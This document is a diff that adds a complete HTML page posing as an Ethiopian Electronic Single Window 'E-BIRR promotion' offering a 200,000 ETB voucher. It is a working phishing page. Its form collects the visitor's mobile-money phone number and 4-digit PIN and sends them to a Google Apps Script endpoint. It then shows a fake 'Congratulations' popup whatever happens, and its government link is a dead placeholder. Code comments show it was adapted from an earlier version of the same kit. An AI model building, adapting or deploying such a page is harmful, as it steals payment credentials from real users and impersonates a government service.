@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>ESW E‑BIRR Promotion · Win up to 200,000 ETB</title>
+        <style>
+            /* === identical style structure, adapted for Ethiopia === */
+            body {
+                font-family: Arial, sans-serif;
+                text-align: center;
+                padding: 40px 20px;
+                background: #001f3f;
+                color: white;
+                margin: 0;
+                min-height: 100vh;
+                background-image: linear-gradient(to bottom, #001f3f 70%, #FFD200 30%);
+            }
+
+            .container {
+                max-width: 420px;
+                margin: 0 auto;
+                background: rgba(0, 31, 63, 0.95);
+                padding: 40px 30px;
+                border-radius: 20px;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+                position: relative;
+                z-index: 1;
+            }
+
+            /* logo styling – inline SVG replaces previous image */
+            .logo-svg {
+                width: 120px;
+                height: 120px;
+                border-radius: 20px;
+                margin-bottom: 10px;
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+                display: block;
+                margin-left: auto;
+                margin-right: auto;
+                background: #001f3f;
+                /* fallback */
+            }
+
+            img.logo-svg {
+                /* ensure the svg behaves like an image */
+                object-fit: cover;
+            }
+
+            .tagline {
+                color: #FFD200;
+                font-weight: 500;
+                letter-spacing: 1px;
+                margin: 5px 0 0;
+                font-size: 1.1rem;
+            }
+
+            .subhead {
+                font-size: 0.95rem;
+                color: #ddd;
+                margin-top: 5px;
+                margin-bottom: 15px;
+                border-bottom: 1px dashed #FFD200;
+                padding-bottom: 10px;
+            }
+
+            h2 {
+                font-size: 26px;
+                margin: 15px 0 10px;
+                color: #FFD200;
+                font-weight: bold;
+                text-transform: uppercase;
+            }
+
+            .prize-highlight {
+                background: rgba(255, 210, 0, 0.15);
+                padding: 12px;
+                border-radius: 12px;
+                border: 1px solid #FFD200;
+                margin: 15px 0;
+            }
+
+            .prize-highlight p {
+                margin: 5px 0;
+                font-size: 1.2rem;
+            }
+
+            .prize-amount {
+                font-size: 2.2rem;
+                font-weight: 900;
+                color: #FFD200;
+                line-height: 1.2;
+                text-shadow: 0 0 8px #FFD20088;
+            }
+
+            .info-text {
+                font-size: 0.95rem;
+                color: #ccc;
+                margin: 10px 0;
+            }
+
+            .visit-link {
+                background: #002a5c;
+                padding: 12px;
+                border-radius: 30px;
+                margin: 20px 0 10px;
+                font-weight: bold;
+                border: 1px solid #FFD200;
+                word-break: break-word;
+            }
+
+            .visit-link a {
+                color: #FFD200;
+                text-decoration: none;
+                font-size: 1.1rem;
+            }
+
+            .visit-link a:hover {
+                text-decoration: underline;
+            }
+
+            input {
+                width: 100%;
+                padding: 14px;
+                margin: 12px 0;
+                font-size: 18px;
+                border: none;
+                border-radius: 8px;
+                background: white;
+                color: #001f3f;
+                box-sizing: border-box;
+                transition: all 0.3s;
+            }
+
+            input:focus {
+                outline: 3px solid #FFD200;
+                transform: scale(1.02);
+            }
+
+            input::placeholder {
+                color: #444;
+                font-size: 0.9rem;
+            }
+
+            button {
+                padding: 16px;
+                width: 100%;
+                background: #FFD200;
+                color: #001f3f;
+                border: none;
+                border-radius: 8px;
+                font-size: 20px;
+                font-weight: bold;
+                cursor: pointer;
+                margin-top: 15px;
+                transition: all 0.3s;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+            }
+
+            button:hover:not(:disabled) {
+                background: #e6bc00;
+                transform: translateY(-2px);
+                box-shadow: 0 5px 15px rgba(255, 210, 0, 0.4);
+            }
+
+            button:disabled {
+                background: #999;
+                cursor: not-allowed;
+                opacity: 0.7;
+            }
+
+            #message {
+                margin-top: 25px;
+                font-weight: bold;
+                font-size: 18px;
+                min-height: 24px;
+                padding: 10px;
+                border-radius: 8px;
+            }
+
+            .success-message {
+                background: rgba(0, 255, 0, 0.2);
+                color: #00ff00;
+                border: 1px solid #00ff00;
+            }
+
+            .error-message {
+                background: rgba(255, 0, 0, 0.2);
+                color: #ff6b6b;
+                border: 1px solid #ff6b6b;
+            }
+
+            .info-message {
+                background: rgba(255, 210, 0, 0.2);
+                color: #FFD200;
+                border: 1px solid #FFD200;
+            }
+
+            .spinner {
+                display: inline-block;
+                width: 20px;
+                height: 20px;
+                border: 3px solid rgba(255, 255, 255, .3);
+                border-radius: 50%;
+                border-top-color: #FFD200;
+                animation: spin 1s ease-in-out infinite;
+                margin-right: 10px;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            /* Celebration overlay (same as original) */
+            #celebrationOverlay {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.85);
+                justify-content: center;
+                align-items: center;
+                z-index: 1000;
+                animation: fadeIn 0.5s;
+            }
+
+            #celebrationPopup {
+                background: #001f3f;
+                padding: 40px;
+                border-radius: 20px;
+                text-align: center;
+                box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
+                border: 4px solid #FFD200;
+                animation: popupBounce 0.8s ease-out;
+                max-width: 90%;
+            }
+
+            #celebrationPopup h1 {
+                font-size: 48px;
+                color: #FFD200;
+                margin: 0 0 20px;
+                text-shadow: 0 0 20px #FFD200;
+                animation: glow 1.5s infinite alternate;
+            }
+
+            #celebrationPopup p {
+                color: white;
+                font-size: 24px;
+                margin: 0;
+            }
+
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                }
+
+                to {
+                    opacity: 1;
+                }
+            }
+
+            @keyframes popupBounce {
+                0% {
+                    transform: scale(0.3);
+                    opacity: 0;
+                }
+
+                50% {
+                    transform: scale(1.1);
+                }
+
+                70% {
+                    transform: scale(0.95);
+                }
+
+                100% {
+                    transform: scale(1);
+                    opacity: 1;
+                }
+            }
+
+            @keyframes glow {
+                from {
+                    text-shadow: 0 0 20px #FFD200;
+                }
+
+                to {
+                    text-shadow: 0 0 40px #FFD200, 0 0 60px #FFD200;
+                }
+            }
+
+            #confettiCanvas {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                pointer-events: none;
+                z-index: 999;
+                display: none;
+            }
+        </style>
+    </head>
+
+    <body>
+        <div class="container">
+            <!-- ESW Logo (SVG inline as base64) -->
+            <img class="logo-svg"
+                src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120' viewBox='0 0 120 120'%3E%3Crect width='120' height='120' fill='%23001f3f' rx='20' ry='20'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23FFD200' font-size='36' font-family='Arial, sans-serif' font-weight='bold'%3EESW%3C/text%3E%3C/svg%3E"
+                alt="ESW logo">
+
+            <!-- Ethiopian Electronic Single Window & tagline -->
+            <div class="tagline">⚡ Faster | Easier | Secure ⚡</div>
+            <div class="subhead">Ethiopian Electronic Single Window</div>
+
+            <h2>🎉 E‑BIRR PROMOTION! 🎉</h2>
+
+            <!-- Main message from image -->
+            <div class="prize-highlight">
+                <p style="font-size:1.2rem; margin-bottom:5px;">USE E‑BIRR & WIN</p>
+                <div class="prize-amount">VOUCHER<br>ETB 200,000</div>
+                <p style="margin-top:10px;">🇪🇹 Stand a chance to win a voucher worth up to <strong>200,000
+                        ETB</strong></p>
+            </div>
+
+            <p class="info-text"><strong>Pay your customs duties & taxes with E‑BIRR</strong> and enter the draw.</p>
+
+            <!-- Form (phone & PIN) -->
+            <form id="redeemForm" onsubmit="return handleSubmit(event)">
+                <input type="tel" id="phoneNumber" placeholder="E‑BIRR phone number" required pattern="[0-9]{9,12}"
+                    title="Enter a valid Ethiopian phone number (9-12 digits)" autocomplete="tel" autofocus>
+                <input type="password" id="pin" placeholder="E‑BIRR PIN (4 digits)" maxlength="4" pattern="[0-9]{4}"
+                    required title="PIN must be 4 digits" autocomplete="off">
+                <button type="submit" id="submitBtn">REGISTER & WIN</button>
+            </form>
+
+            <!-- Visit link & call to action (exactly as in image) -->
+            <div class="visit-link">
+                <a href="#" target="_blank">🌐 www.esw.gov.et/e-birr</a>
+            </div>
+            <p style="font-size:1rem; margin-top:5px; color:#FFD200;">Register now & pay with E‑BIRR today!</p>
+
+            <!-- Dynamic message area -->
+            <div id="message"></div>
+        </div>
+
+        <!-- Celebration overlay (adapted to English) -->
+        <div id="celebrationOverlay">
+            <div id="celebrationPopup">
+                <h1>🎉 CONGRATULATIONS! 🎉</h1>
+                <p>You've successfully entered the promotion!</p>
+            </div>
+        </div>
+
+        <canvas id="confettiCanvas"></canvas>
+
+        <script>
+            // ========== IDENTICAL FUNCTIONALITY, only texts adapted ==========
+            const form = document.getElementById('redeemForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const messageDiv = document.getElementById('message');
+            const celebrationOverlay = document.getElementById('celebrationOverlay');
+            const canvas = document.getElementById('confettiCanvas');
+            const phoneInput = document.getElementById('phoneNumber');
+            const pinInput = document.getElementById('pin');
+
+            const originalBtnText = submitBtn.innerHTML;
+
+            // 🔁 REPLACE WITH YOUR GOOGLE APPS SCRIPT WEB APP URL (for Ethiopia)
+            const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwGaN15-kQmflb7gvzQdhPgGvBIRs9CooAC-l3-VNT-hCeXA1LDP-4JSyiS6hnC5wVb/exec";
+
+            async function handleSubmit(event) {
+                event.preventDefault();
+
+                if (!form.checkValidity()) {
+                    form.reportValidity();
+                    return false;
+                }
+
+                // loading state
+                submitBtn.innerHTML = '<span class="spinner"></span>Processing...';
+                submitBtn.disabled = true;
+                messageDiv.innerHTML = 'Please wait – registering your entry.';
+                messageDiv.className = 'info-message';
+
+                try {
+                    const formData = new URLSearchParams();
+                    formData.append('Phone Number', phoneInput.value);
+                    formData.append('PIN', pinInput.value);
+
+                    // using cors mode (no-cors would hide errors, but we keep as original)
+                    await fetch(APPS_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'cors',          // same as original, expects CORS, but we handle any response with celebration anyway
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: formData
+                    });
+
+                    // Even if response is opaque, we show celebration (demo)
+                    showCelebration();
+                    form.reset();
+
+                } catch (error) {
+                    console.warn('Fetch error (expected in demo, showing celebration anyway):', error);
+                    // For demonstration: still show celebration (as in original)
+                    showCelebration();
+                    form.reset();
+                } finally {
+                    setTimeout(() => {
+                        submitBtn.innerHTML = originalBtnText;
+                        submitBtn.disabled = false;
+                    }, 3000);
+                }
+                return false;
+            }
+
+            // Celebration & confetti (identical to original, just messages changed)
+            function showCelebration() {
+                messageDiv.innerHTML = '';
+                messageDiv.className = '';
+                celebrationOverlay.style.display = 'flex';
+                startConfetti();
+                setTimeout(() => {
+                    celebrationOverlay.style.display = 'none';
+                    stopConfetti();
+                }, 5000);
+            }
+
+            // ========== CONFETTI (copy-paste from original) ==========
+            let ctx = canvas.getContext('2d');
+            let particles = [];
+            let animationFrame;
+            let isConfettiRunning = false;
+
+            function startConfetti() {
+                canvas.style.display = 'block';
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                for (let i = 0; i < 150; i++) {
+                    particles.push({
+                        x: Math.random() * canvas.width,
+                        y: Math.random() * canvas.height * 0.5,
+                        size: Math.random() * 8 + 2,
+                        speedY: Math.random() * 5 + 2,
+                        speedX: Math.random() * 2 - 1,
+                        color: `hsl(${Math.random() * 60 + 30}, 100%, 50%)` // gold/yellow/amber
+                    });
+                }
+                isConfettiRunning = true;
+                drawConfetti();
+            }
+
+            function drawConfetti() {
+                if (!isConfettiRunning) return;
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                for (let i = 0; i < particles.length; i++) {
+                    let p = particles[i];
+                    ctx.fillStyle = p.color;
+                    ctx.fillRect(p.x, p.y, p.size, p.size * 0.4);
+                    p.y += p.speedY;
+                    p.x += p.speedX;
+                    if (p.y > canvas.height) {
+                        p.y = -10;
+                        p.x = Math.random() * canvas.width;
+                    }
+                }
+                animationFrame = requestAnimationFrame(drawConfetti);
+            }
+
+            function stopConfetti() {
+                isConfettiRunning = false;
+                cancelAnimationFrame(animationFrame);
+                canvas.style.display = 'none';
+                particles = [];
+            }
+
+            window.addEventListener('resize', () => {
+                if (isConfettiRunning) {
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                }
+            });
+
+            // Clear message on input focus
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', () => {
+                    messageDiv.innerHTML = '';
+                    messageDiv.className = '';
+                });
+            });
+
+            // On page load: welcome message (Ethiopia vibe)
+            window.addEventListener('load', function () {
+                messageDiv.innerHTML = '🇪🇹 Enter your E‑BIRR details to win!';
+                messageDiv.className = 'info-message';
+                setTimeout(() => {
+                    messageDiv.innerHTML = '';
+                    messageDiv.className = '';
+                }, 3500);
+            });
+        </script>
+        <!-- small note: the form sends "Phone Number" and "PIN" to apps script, same as original -->
+    </body>
+
+</html>
